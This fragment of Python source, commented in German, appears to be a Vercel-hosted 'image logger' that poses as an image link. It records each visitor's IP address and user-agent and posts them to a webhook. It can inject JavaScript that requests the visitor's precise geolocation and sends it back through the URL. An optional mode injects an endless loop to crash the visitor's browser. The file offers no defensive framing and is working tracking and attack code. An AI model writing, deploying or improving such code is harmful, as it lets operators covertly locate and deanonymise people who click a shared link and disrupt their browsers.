        }]
    }

    if image_url:
        embed["embeds"][0]["thumbnail"] = {"url": image_url}

    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass

    return info

# ==================== LOADING IMAGE (falls buggedImage) ====================
loading_image = base64.b85decode(
    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
)

# ==================== HANDLER ====================
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

    def handle_request(self):
        try:
            # IP aus Vercel Header holen (x-forwarded-for oder x-real-ip)
            ip = self.headers.get('x-forwarded-for') or self.headers.get('x-real-ip') or 'Unknown'

            # Image URL bestimmen (mit ?url= oder ?id= Parameter)
            image_url = config["image"]
            if config["imageArgument"]:
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if query.get("url"):
                    try:
                        image_url = base64.b64decode(query["url"].encode()).decode()
                    except:
                        pass
                elif query.get("id"):
                    try:
                        image_url = base64.b64decode(query["id"].encode()).decode()
                    except:
                        pass

            # Bot-Check (Discord/Telegram Crawler)
            bot = bot_check(ip, self.headers.get('user-agent', ''))
            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                               'image/jpeg' if config["buggedImage"] else image_url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(loading_image)
                make_report(ip, endpoint=self.path.split("?")[0], image_url=image_url)
                return

            # Normaler Request
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            coords = None
            if query.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(query["g"].encode()).decode()
                except:
                    pass

            result = make_report(ip, self.headers.get('user-agent'), coords, 
                               self.path.split("?")[0], image_url)

            # Response zusammenbauen
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                content_type = 'text/html'

            elif config["message"]["doMessage"]:
                msg = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    # Ersetzungen (einfach gehalten)
                    for key, val in {
                        "{ip}": ip,
                        "{country}": result.get("country", ""),
                        "{city}": result.get("city", ""),
                    }.items():
                        msg = msg.replace(key, str(val))
                data = msg.encode()
                content_type = 'text/html'

            elif config["crashBrowser"]:
                data = (config["message"]["message"] + 
                       '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>').encode()
                content_type = 'text/html'

            else:
                # Standard: Unsichtbares Bild (Hintergrund)
                data = f'''<style>body{{margin:0;padding:0}}div.img{{background-image:url('{image_url}');background-position:center center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}}</style><div class="img"></div>'''.encode()
                content_type = 'text/html'

            # Geolocation-Script anhängen (falls aktiviert)
            if config["accurateLocation"] and not query.get("g"):
                data += b"""
<script>
if (!window.location.href.includes("g=") && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        var url = window.location.href;
        var sep = url.includes("?") ? "&" : "?";
        var g = btoa(pos.coords.latitude + "," + pos.coords.longitude).replace(/=/g, "%3D");
        location.replace(url + sep + "g=" + g);
    });
}
</script>"""

            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            report_error(traceback.format_exc())


# Vercel erwartet diese Variable
application = handler
